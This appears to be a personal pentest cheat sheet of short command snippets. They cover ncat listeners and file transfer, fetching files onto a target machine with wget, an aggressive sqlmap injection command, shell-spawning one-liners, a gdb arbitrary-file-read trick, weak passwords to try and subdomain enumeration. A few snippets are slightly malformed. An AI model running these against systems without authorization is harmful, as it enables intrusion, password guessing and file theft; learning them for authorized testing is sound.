# HackNotes 【第一】🐱‍💻 my personal pentest notes

## Introduction to Cyber Security

Cybersecurity is the body of technologies, processes and practices designed to protect networks, computers, programs and data from attack, damage or unauthorized access

## Basics

### nmap-ncat
##### Listen to Inbound Connections
`ncat -l [PORT]`
##### Connect to Remote System
`ncat [IP] [PORT]`
##### Copy Files Using ncat
Receiver: `ncat -l [PORT] > file.ext`
Sender: `ncat [IP] [PORT] --send-only < file.ext`

### SCP (Secure Copy)
##### Basic Syntax
`scp [SOURCE_FILE_PATH] [DESTINATION_FILE_PATH]`
##### Sending File From Remote Host to Local Host
`scp [user]@[IP]:/[PATH]/[PATH]/file.ext outputfile.ext`

### wget
##### Prepate the HTTP Server
`python-m http.server [PORT]`
##### On the Target Machine
`wget [IP/URL]:[PORT] -O filename.ext`

###SQL injection
#####sqlmap
`sqlmap --batch -u "[URL]" --data "[DATA]" --cookie "[]" -p [PARAM] --level=5 --dbms=[DB] --technique=T --dbs`

### Spawning 🐚
##### python
`python -c 'import pty; pty.spawn("/bin/sh")'`
##### echo
`echo 'os.system('/bin/bash')'`
##### bash
`/bin/bash -i`
##### sh
`/bin/sh -i`

### Useful Trickeries
##### gdb file read 
`gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit`

### Bad Passwords worth to try
- qazwsxedc
- p4ssw0rd

### Searching for Subdomains
##### theHarvester
`theHarvester --domain [DOMAIN] --limit 1000 --source all`

### Fix Kali Linux WSL ping problem
`sudo setcap cap_net_raw+ep /usr/bin/ping`

### Easy Pentest Steps
#### Black-Box

## Learn From Walkthroughs
- https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/ (brute forcing basic authentication)
